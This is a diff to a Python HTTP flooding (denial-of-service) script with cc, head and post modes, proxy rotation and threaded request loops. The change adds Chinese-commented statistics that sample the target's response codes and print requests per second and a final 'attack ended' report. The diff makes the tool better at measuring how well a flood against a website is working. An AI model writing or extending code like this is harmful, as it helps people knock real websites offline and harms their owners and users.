@@ -14,6 +14,20 @@ import sys
 import ssl
 import datetime
 import os
+from collections import defaultdict
+import threading
+
+# 全局统计变量
+stats_lock = threading.Lock()
+request_count = 0
+status_codes = defaultdict(int)
+error_count = 0
+success_count = 0
+start_time = time.time()
+
+# 统计配置
+REPORT_INTERVAL = 10000  # 每10000次请求打印一次统计
+SAMPLE_RATE = 100       # 每100个请求采样1个进行详细分析
 
 
 
@@ -113,7 +127,65 @@ def build_threads(mode,thread_num,event,proxy_type):
 			th = threading.Thread(target = head,args=(event,proxy_type,))
 			th.daemon = True
 			th.start()
-			
+
+def update_stats_sample(status_code=None, is_error=False):
+    """采样统计版本 - 只对部分请求进行详细统计"""
+    global request_count, status_codes, error_count, success_count
+    
+    with stats_lock:
+        request_count += 1
+        
+        # 只对每SAMPLE_RATE个请求中的1个进行详细统计
+        if request_count % SAMPLE_RATE == 0:
+            if is_error:
+                error_count += 1
+                status_codes['ERROR'] += 1
+            elif status_code:
+                success_count += 1
+                status_codes[status_code] += 1
+        
+        # 每达到报告间隔就打印统计信息
+        if request_count % REPORT_INTERVAL == 0:
+            print_stats()
+
+def print_stats():
+    """打印统计信息"""
+    elapsed_time = time.time() - start_time
+    rps = request_count / elapsed_time if elapsed_time > 0 else 0
+    
+    print(f"\n{'='*60}")
+    print(f"执行统计报告 - 总请求数: {request_count}")
+    print(f"运行时间: {elapsed_time:.2f}秒 | 平均RPS: {rps:.2f}")
+    print(f"采样统计 (采样率: 1/{SAMPLE_RATE}):")
+    print(f"  采样成功: {success_count} | 采样失败: {error_count}")
+    print(f"{'='*60}")
+    
+    # 按状态码分组显示（基于采样数据）
+    if status_codes:
+        print("状态码分布 (采样数据):")
+        sorted_codes = sorted(status_codes.items(), key=lambda x: x[1], reverse=True)
+        total_samples = sum(status_codes.values())
+        for code, count in sorted_codes:
+            percentage = (count / total_samples) * 100 if total_samples > 0 else 0
+            estimated_total = count * SAMPLE_RATE  # 估算总数
+            print(f"  {code}: {count} 次采样 ({percentage:.1f}%) [估算总数: ~{estimated_total}]")
+    
+    print(f"{'='*60}\n")
+
+def parse_response(response_data):
+    """解析HTTP响应获取状态码"""
+    try:
+        if response_data:
+            response_str = response_data.decode('utf-8', errors='ignore')
+            lines = response_str.split('\n')
+            if lines and 'HTTP/' in lines[0]:
+                parts = lines[0].split()
+                if len(parts) >= 2:
+                    return int(parts[1])
+    except:
+        pass
+    return None
+	
 
 def getuseragent():
 	platform = Choice(['Macintosh', 'Windows', 'X11'])
@@ -258,8 +330,22 @@ def cc(event,proxy_type):
 					request = get_host + header
 					sent = s.send(str.encode(request))
 					if not sent:
-						proxy = Choice(proxies).strip().split(":")
-						break
+					    proxy = Choice(proxies).strip().split(":")
+					    update_stats_sample(is_error=True)
+					    break
+					
+					# 只对采样的请求进行响应解析
+					if request_count % SAMPLE_RATE == 0:
+					    try:
+					        s.settimeout(1)  # 设置较短的超时时间
+					        response = s.recv(1024)
+					        status_code = parse_response(response)
+					        update_stats_sample(status_code=status_code)
+					    except:
+					        update_stats_sample(is_error=True)
+					else:
+					    # 非采样请求只做简单计数
+					    update_stats_sample()
 				#s.setsockopt(socket.SO_LINGER,0)
 				s.close()
 			except:
@@ -295,8 +381,23 @@ def head(event,proxy_type):#HEAD MODE
 					request = head_host + header
 					sent = s.send(str.encode(request))
 					if not sent:
-						proxy = Choice(proxies).strip().split(":")
-						break#   This part will jump to dirty fix
+					    proxy = Choice(proxies).strip().split(":")
+					    update_stats_sample(is_error=True)
+					    break
+					
+					# 只对采样的请求进行响应解析
+					if request_count % SAMPLE_RATE == 0:
+					    try:
+					        s.settimeout(1)
+					        response = s.recv(1024)
+					        status_code = parse_response(response)
+					        update_stats_sample(status_code=status_code)
+					    except:
+					        update_stats_sample(is_error=True)
+					else:
+					    # 非采样请求只做简单计数
+					    update_stats_sample()
+
 				s.close()
 			except:
 				s.close()
@@ -326,8 +427,22 @@ def post(event,proxy_type):
 				for _ in range(100):
 					sent = s.send(str.encode(request))
 					if not sent:
-						proxy = Choice(proxies).strip().split(":")
-						break
+					    proxy = Choice(proxies).strip().split(":")
+					    update_stats_sample(is_error=True)
+					    break
+					
+					# 只对采样的请求进行响应解析
+					if request_count % SAMPLE_RATE == 0:
+					    try:
+					        s.settimeout(1)
+					        response = s.recv(1024)
+					        status_code = parse_response(response)
+					        update_stats_sample(status_code=status_code)
+					    except:
+					        update_stats_sample(is_error=True)
+					else:
+					    # 非采样请求只做简单计数
+					    update_stats_sample()
 				s.close()
 			except:
 				s.close()
@@ -745,6 +860,8 @@ def main():
 	event.set()
 	print("> Flooding...")
 	time.sleep(period)
+	print("\n> 攻击结束，最终统计:")
+	print_stats()
 
 if __name__ == "__main__":
 	main()#Coded by Leeon123
